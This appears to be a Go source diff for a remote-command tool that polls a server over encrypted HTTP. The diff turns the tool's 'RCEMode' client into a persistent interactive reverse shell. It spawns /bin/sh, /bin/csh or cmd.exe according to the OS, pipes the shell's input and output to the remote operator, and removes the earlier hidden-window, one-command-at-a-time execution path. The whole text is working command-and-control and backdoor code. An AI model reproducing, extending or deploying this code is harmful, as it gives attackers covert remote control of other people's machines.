@@ -17,9 +17,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"regexp"
-	"strings"
-	"syscall"
+	"runtime"
 	"time"
 )
 
@@ -44,18 +42,19 @@ var (
 	TIMEOUT        = 10 * time.Second
 	TIMEOUT_CLIENT = 30 * time.Second
 
-	rCMD = regexp.MustCompile(`("[^"]*"|[^"\s]+)(\s+|$)`)
+	stdin io.WriteCloser
 )
 
 func main() {
 	if ServerMode {
 		if RCEMode {
+			makeCMD()
 			http.HandleFunc("/", handlerReverseClient)
 			go func() {
 				for {
 					time.Sleep(TIMEOUT_CLIENT)
 					if !CheckHealth.IsZero() && time.Now().After(CheckHealth.Add(TIMEOUT_CLIENT)) {
-						fmt.Println("client has disconnected")
+						fmt.Printf("\n[Error] client has disconnected\n")
 						reset()
 					}
 				}
@@ -82,6 +81,18 @@ func main() {
 
 		id := uuid()
 		if RCEMode {
+			makeCMD()
+
+			go func() {
+				//send output
+				for {
+					select {
+					case out := <-OutputChannel:
+						_ = makeRequest(url, http.MethodPost, id, []byte(out))
+					}
+				}
+			}()
+
 			for {
 				// get cmd
 				for {
@@ -92,34 +103,70 @@ func main() {
 					runCommand(c)
 					break
 				}
-
-				//send output
-				out := <-OutputChannel
-				_ = makeRequest(url, http.MethodPost, id, []byte(out))
 			}
 		} else {
 			go func() {
 				for {
 					makeRequest(url, http.MethodPost, id, nil)
-					time.Sleep(28 * time.Second)
+					time.Sleep(TIMEOUT_CLIENT - (2 * time.Second))
 				}
 			}()
-			reader := bufio.NewReader(os.Stdin)
-			for {
-				fmt.Printf("# ")
-				text, _ := reader.ReadString('\n')
-				_ = makeRequest(url, http.MethodPost, id, []byte(text))
+
+			go func() {
 				for {
 					o := makeRequest(url, http.MethodGet, id, nil)
 					if len(o) > 0 {
-						fmt.Println(o)
-						break
+						fmt.Printf(o)
 					}
 				}
+			}()
+
+			reader := bufio.NewReader(os.Stdin)
+			for {
+				text, _ := reader.ReadString('\n')
+				_ = makeRequest(url, http.MethodPost, id, []byte(text))
 			}
 		}
 	}
 
+}
+
+func makeCMD() {
+	shell := "/bin/sh"
+	switch runtime.GOOS {
+	case "linux":
+		shell = "/bin/sh"
+	case "freebsd":
+		shell = "/bin/csh"
+	case "windows":
+		shell = "cmd.exe"
+	}
+	myCMD := exec.Command(shell)
+	stdoutIn, err := myCMD.StdoutPipe()
+	if err != nil {
+		log.Fatal(err)
+	}
+	go func() {
+		copyAndCapture(stdoutIn)
+	}()
+
+	stderrIn, err := myCMD.StderrPipe()
+	if err != nil {
+		log.Fatal(err)
+	}
+	go func() {
+		copyAndCapture(stderrIn)
+	}()
+
+	stdin, err = myCMD.StdinPipe()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = myCMD.Start()
+	if err != nil {
+		log.Fatal(err)
+	}
 }
 
 func makeInput(c chan string) chan string {
@@ -129,7 +176,6 @@ func makeInput(c chan string) chan string {
 		}()
 		reader := bufio.NewReader(os.Stdin)
 		for {
-			fmt.Printf("# ")
 			text, _ := reader.ReadString('\n')
 			c <- text
 		}
@@ -160,12 +206,6 @@ func sendCMD() {
 
 	for c = range makeInput(channelInput) {
 		CMDChannel <- c
-		select {
-		case out := <-OutputChannel:
-			fmt.Println(out)
-			fmt.Printf("# ")
-		case <-time.After(TIMEOUT):
-		}
 	}
 }
 
@@ -212,7 +252,7 @@ func handlerClient(w http.ResponseWriter, r *http.Request) {
 		}
 		text, err := decrypt(CurrentID, string(body))
 		if err == nil {
-			OutputChannel <- text
+			fmt.Printf(text)
 		}
 		io.WriteString(w, "ok")
 		return
@@ -252,18 +292,6 @@ func handlerReverseClient(w http.ResponseWriter, r *http.Request) {
 		io.WriteString(w, "ok")
 		return
 	}
-}
-
-func parseCmd(cmd string) (string, []string) {
-	cmds := rCMD.FindAllString(cmd, -1)
-	for k, v := range cmds {
-		cmds[k] = strings.TrimSpace(v)
-	}
-
-	if len(cmds) == 1 {
-		return cmds[0], nil
-	}
-	return cmds[0], cmds[1:]
 }
 
 func checkClient(r *http.Request) bool {
@@ -345,15 +373,10 @@ func makeRequest(url, method, id string, payload []byte) string {
 }
 
 func runCommand(c string) {
-	fun, agrs := parseCmd(c)
-	cmd := exec.Command(fun, agrs...)
-	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	outErr := ""
-	out, err := cmd.CombinedOutput()
+	_, err := io.WriteString(stdin, c)
 	if err != nil {
-		outErr = err.Error()
+		log.Println(err)
 	}
-	OutputChannel <- string(out) + outErr
 }
 
 func encrypt(keyStr string, plainText []byte) (encoded string, err error) {
@@ -402,6 +425,24 @@ func decrypt(keyStr string, secure string) (decoded string, err error) {
 	stream.XORKeyStream(cipherText, cipherText)
 
 	return string(cipherText), err
+}
+
+func copyAndCapture(r io.Reader) {
+	buf := make([]byte, 1024, 1024)
+	for {
+		n, err := r.Read(buf[:])
+		if n > 0 {
+			d := buf[:n]
+			OutputChannel <- string(d)
+		}
+		if err != nil {
+			if err == io.EOF {
+				err = nil
+				return
+			}
+			log.Println(err)
+		}
+	}
 }
 
 func init() {
